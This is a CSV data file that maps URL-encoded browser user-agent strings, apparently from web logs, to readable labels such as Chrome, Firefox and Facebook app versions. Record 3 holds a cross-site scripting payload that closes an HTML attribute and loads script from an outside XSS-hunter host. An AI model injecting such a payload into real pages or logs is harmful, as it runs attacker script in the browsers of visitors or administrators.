Record_ID,Calling_Agents,Calling_Agents_Description
1,"%20%5BFBAN/FBIOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/2;FBID/phone;FBLC/en_Qaau_US;FBOP/5%5D",Facebook App on iOS
2,"%20%5BFBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5%5D",Facebook App on iOS
3,%22%3E%3Cscript%20src=https://omlomo.xss.ht/kolkata24x7.com%3E%3C/script%3E,Unknown
4,%22Firefox%2024/Windows:%20Mozilla/5.0%20(Windows%20NT%206.1;%20WOW64;%20rv:24.0)%20Gecko/20100101%20Firefox/24.0%22,Firefox 24 on Windows
5,"%22Mozilla/5.0%20(Macintosh;%20Intel%20Mac%20OS%20X%2010_9_2)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/34.0.1847.131%20Safari/537.36%22",Chrome 34 on Mac
6,"%22Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/68.0.3282.167%20Safari/537.36%22,",Chrome 68 on Windows
7,"%22Mozilla/5.0%20(Windows%20NT%2010.5;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/64.0.3282.186%20Safari/537.36%22",Chrome 64 on Windows
8,%22Mozilla/5.0%20(Windows%20NT%206.1;%20rv:23.0)%20Gecko/20131011%20Firefox/23.0%22,Firefox 23 on Windows
9,"%22Mozilla/5.0%20(Windows%20NT%206.1;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/54.0.2840.99%20Safari/537.36%22",Chrome 54 on Windows
10,"%22Mozilla/5.0%20(Windows%20NT%206.1;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/64.0.3282.186%20Safari/537.36%22",Chrome 64 on Windows
11,"%22Mozilla/5.0%20(Windows%20NT%206.1;%20Win64;%20x67)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/64.0.3282.186%20Safari/537.36%22",Chrome 64 on Windows
12,%22Mozilla/5.0%20(Windows%20NT%206.1;%20WOW64;%20rv:22.0)%20Gecko/20100101%20Firefox/22.0%22,Firefox 22 on Windows
13,%22Mozilla/5.0%20(Windows%20NT%206.3;%20WOW64;%20rv:41.0)%20Gecko/20100101%20Firefox/41.0%22,Firefox 41 on Windows
14,"%22Mozilla/5.0%20(Windows%20NT%206.9;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/64.0.3282.186%20Safari/537.36%22",Chrome 64 on Windows
15,%22Mozilla/5.0%20(X11;%20Linux%20x86_64;%20rv:78.0)%20Gecko/20100101%20Firefox/78.0%22,Firefox 78 on Linux
16,"%22Mozilla/5.0%20(X11;%20U;%20Linux%20i686%20(x86_64);%20en-US)%20AppleWebKit/534.12%20(KHTML,%20like%20Gecko)%20Chrome/9.0.576.0%20Safari/534.12%22",Chrome 9 on Linux
17,%27Mozilla/5.0%20(compatible;%20DuckDuckBot-Https/1.1;%20https://duckduckgo.com/duckduckbot)%27,Unknown bot
18,%27Mozilla/5.0%20(compatible;%20Seekport%20Crawler;%20http://seekport.com/%27,Unknown browser
19,"%27Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/70.0.3538.77%20Safari/537.36%27",Chrome 70 on Windows
20,"%27Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/90.0.4430.212%20Safari/537.36%27",Chrome 90 on Windows
21,"%5BFBAN/FB4A;FBAV/205.0.0.27.113;FBBV/139196832;FBDM/%7Bdensity=1.5,width=540,height=960%7D;FBLC/en_US;FBRV/139933975;FBCR/;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo%201606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;%5D",Facebook App 205 on Vivo
22,"%5BFBAN/FB4A;FBAV/214.0.0.43.83;FBBV/147376226;FBDM/%7Bdensity=1.75,width=720,height=1396%7D;FBLC/en_GB;FBRV/148264743;FBCR/Jio%204G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;%5D",Facebook App 214 on Samsung SM-J415F
23,"%5BFBAN/FB4A;FBAV/219.0.0.46.114;FBBV/152515152;FBDM/%7Bdensity=2.0,width=720,height=1344%7D;FBLC/en_US;FBRV/153789546;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi%207A;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;%5D",Facebook App 219 on Redmi
24,"%5BFBAN/FB4A;FBAV/219.0.0.46.114;FBBV/152515152;FBDM/%7Bdensity=2.75,width=1080,height=2130%7D;FBLC/en_US;FBRV/0;FBCR/Vodafone%20IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi%20Note%207%20Pro;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;%5D",Facebook App 219 on Redmi
